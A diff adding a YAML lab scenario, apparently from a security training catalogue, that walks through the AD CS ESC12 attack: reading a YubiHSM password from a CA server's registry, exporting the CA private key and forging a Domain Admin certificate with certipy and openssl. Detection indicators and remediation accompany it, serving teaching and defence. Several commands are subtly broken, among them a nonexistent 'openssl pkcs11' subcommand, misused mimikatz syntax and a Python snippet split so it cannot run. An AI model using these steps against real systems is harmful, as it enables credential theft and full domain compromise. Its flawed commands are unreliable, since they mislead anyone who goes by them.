@@ -1,0 +1,189 @@
+# Category: Active Directory - AD CS Attacks
+name: "AD CS ESC12 — YubiHSM CA Private Key Extraction"
+id: "ad-adcs-esc12-001"
+category: "active_directory"
+subcategory: "ad_cs_attacks"
+difficulty: "expert"
+estimated_time: "90 minutes"
+
+description: |
+  Exploit Active Directory Certificate Services (AD CS) configurations where the
+  CA private key is stored on a Yubico YubiHSM hardware security module (ESC12).
+  If an attacker gains privileged access to the CA server operating system,
+  they can extract the YubiHSM authentication key from the Windows registry
+  (stored in plaintext at HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\
+  AuthKeysetPassword) and use it to unlock the HSM, extract the CA private key,
+  and issue arbitrary "golden" certificates for any domain user.
+
+learning_objectives:
+  - Understand YubiHSM integration with AD CS
+  - Identify YubiHSM authentication keys stored in the Windows registry
+  - Extract and use YubiHSM keys to access CA private key material
+  - Issue forged certificates using extracted CA private keys
+
+tools:
+  - yubihsm-shell
+  - certutil
+  - mimikatz
+  - reg query
+  - openssl
+  - certipy
+
+prerequisites:
+  - Administrative or SYSTEM access to the CA server operating system
+  - CA private key stored on YubiHSM2 device
+  - YubiHSM authentication key stored in registry (default configuration)
+  - Physical or remote access to CA server
+  - Understanding of HSM operations and PKCS#11
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify CA servers using YubiHSM for key storage"
+    commands:
+      - "# Check if YubiHSM is installed on CA server"
+      - "reg query \\ '[ca_server]' \ 'HKLM\SOFTWARE\Yubico\YubiHSM'"
+      - "# Check for YubiHSM service"
+      - "sc \\ '[ca_server]' query yubihsm-connector"
+      - "# Check CA key storage provider"
+      - "certutil -config '[ca_server]\\[ca_name]' -key"
+      - "# Check for PKCS#11 provider"
+      - "certutil -csplist | findstr -i 'yubi'"
+    expected_output: "Confirmation of YubiHSM usage and registry key locations"
+    detection: "Registry queries for YubiHSM configuration; service enumeration"
+
+  - id: "step2"
+    phase: "enumeration"
+    action: "Extract YubiHSM authentication key from registry"
+    commands:
+      - "# Extract the YubiHSM AuthKeysetPassword from registry"
+      - "reg query \\ '[ca_server]' \ 'HKLM\SOFTWARE\Yubico\YubiHSM' /v AuthKeysetPassword"
+      - "# Alternative: Use mimikatz to dump registry"
+      - "mimikatz # lsadump::sam /registry:remote /system:\\ '[ca_server]'"
+      - "# Alternative: Use remote registry access"
+      - "python3 -c \"
+      - "import winreg"
+      - "key = winreg.ConnectRegistry('[ca_server]', winreg.HKEY_LOCAL_MACHINE)"
+      - "subkey = winreg.OpenKey(key, 'SOFTWARE\\Yubico\\YubiHSM')"
+      - "value, _ = winreg.QueryValueEx(subkey, 'AuthKeysetPassword')"
+      - "print(value)"
+      - """
+    expected_output: "Plaintext YubiHSM authentication key/password"
+    detection: "Remote registry access to YubiHSM keys; mimikatz execution on CA"
+
+  - id: "step3"
+    phase: "exploitation"
+    action: "Connect to YubiHSM and enumerate keys"
+    commands:
+      - "# Install yubihsm-shell if needed"
+      - "# Connect to YubiHSM using extracted auth key"
+      - "yubihsm-shell"
+      - "yubihsm> connect"
+      - "yubihsm> session open [auth_key_id] [auth_key_password]"
+      - "# List objects on the HSM"
+      - "yubihsm> list objects"
+      - "# Get detailed information about CA key"
+      - "yubihsm> get objectinfo [ca_key_id] asymmetric_key"
+    expected_output: "List of cryptographic objects including CA private key on YubiHSM"
+    detection: "YubiHSM shell connections; authentication attempts to HSM"
+
+  - id: "step4"
+    phase: "exploitation"
+    action: "Export CA private key from YubiHSM"
+    commands:
+      - "# Export the CA private key (if exportable)"
+      - "yubihsm> get asymmetric [ca_key_id]"
+      - "# Alternative: Use PKCS#11 to extract key"
+      - "openssl pkcs11 -module /usr/lib/x86_64-linux-gnu/pkcs11/yubihsm_pkcs11.so -login -pin [auth_key_password] -list-certs"
+      - "# Extract CA certificate and private key"
+      - "openssl pkcs11 -module /usr/lib/x86_64-linux-gnu/pkcs11/yubihsm_pkcs11.so -login -pin [auth_key_password] -in 'ca_cert' -out ca.pfx"
+      - "# If key is non-exportable, use it directly for signing"
+      - "# Create a CSR and sign it using the HSM"
+    expected_output: "CA private key exported or accessible for signing operations"
+    detection: "YubiHSM key export operations; PKCS#11 certificate extraction"
+
+  - id: "step5"
+    phase: "post_exploitation"
+    action: "Forge golden certificate for Domain Admin"
+    commands:
+      - "# Use Certipy to forge a certificate with extracted CA key"
+      - "certipy forge -ca-pfx ca.pfx -upn 'Administrator@[domain]' -subject 'CN=Administrator,CN=Users,DC=[dc1],DC=[dc2]'"
+      - "# Or use openssl to create and sign certificate"
+      - "openssl req -new -keyout fake_admin.key -out fake_admin.csr -subj '/CN=Administrator/DC=[dc1]/DC=[dc2]'"
+      - "openssl x509 -req -in fake_admin.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out fake_admin.crt -days 365"
+      - "openssl pkcs12 -export -in fake_admin.crt -inkey fake_admin.key -out fake_admin.pfx"
+      - "# Authenticate with forged certificate"
+      - "certipy auth -pfx fake_admin.pfx -dc-ip [dc_ip]"
+    expected_output: "fake_admin.pfx containing forged Domain Admin certificate"
+    detection: "Certificate forgery using CA private key; unauthorized certificate issuance"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1649"
+    description: "Steal or Forge Authentication Certificates"
+  - standard: "MITRE ATT&CK"
+    control: "T1552"
+    description: "Unsecured Credentials"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-12"
+    description: "Cryptographic Key Establishment and Management"
+  - standard: "CIS Controls v8"
+    control: "10.1"
+    description: "Deploy and maintain anti-malware software on all assets"
+
+detection:
+  network_indicators:
+    - "Remote registry access to CA server"
+    - "YubiHSM connector connections from unexpected sources"
+  log_indicators:
+    - "Registry access to HKLM\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword"
+    - "YubiHSM authentication attempts from non-standard processes"
+    - "Certificate issuance outside normal CA workflows"
+    - "Event ID 4887: Certificate issued without proper request workflow"
+  endpoint_indicators:
+    - "mimikatz execution on CA server"
+    - "yubihsm-shell or PKCS#11 tool execution"
+    - "Registry queries for YubiHSM auth keys"
+    - "Certificate export operations on CA"
+
+remediation:
+  immediate:
+    - "Remove YubiHSM authentication keys from Windows registry"
+    - "Store HSM authentication keys in secure credential vault (Azure Key Vault, HashiCorp Vault)"
+    - "Rotate all YubiHSM authentication keys"
+    - "Audit all certificates issued by the CA in the last 90 days"
+    - "Restrict physical and remote access to CA servers"
+  long_term:
+    - "Use FIPS 140-2/140-3 Level 3 certified HSMs with proper key ceremony"
+    - "Implement network isolation for CA servers (Tier 0)"
+    - "Use smart card or MFA for HSM authentication instead of registry-stored passwords"
+    - "Deploy CA servers as offline root CAs with intermediate CAs online"
+    - "Monitor for unauthorized access to CA servers and HSM devices"
+    - "Regular penetration testing of PKI infrastructure"
+
+variables:
+  domain: "corp.example.com"
+  dc1: "corp"
+  dc2: "example"
+  dc_ip: "192.168.1.10"
+  ca_server: "ca01.corp.example.com"
+  ca_name: "corp-CA01-CA"
+  auth_key_id: "1"
+  auth_key_password: "plaintext_password_from_registry"
+  ca_key_id: "100"
+
+assessment_questions:
+  - "Where is the YubiHSM authentication key stored by default on Windows?"
+  - "Why is storing HSM authentication keys in the registry dangerous?"
+  - "What is the ultimate goal of an ESC12 attack?"
+  - "How can organizations securely manage HSM authentication credentials?"
+
+references:
+  - url: "https://github.com/ly4k/Certipy"
+    title: "Certipy - AD CS Attack Tool"
+  - url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+    title: "Certified Pre-Owned - SpecterOps"
+  - url: "https://developers.yubico.com/YubiHSM2/"
+    title: "YubiHSM2 Developer Documentation"
+  - url: "https://attack.mitre.org/techniques/T1649/"
+    title: "MITRE ATT&CK - Steal or Forge Authentication Certificates"
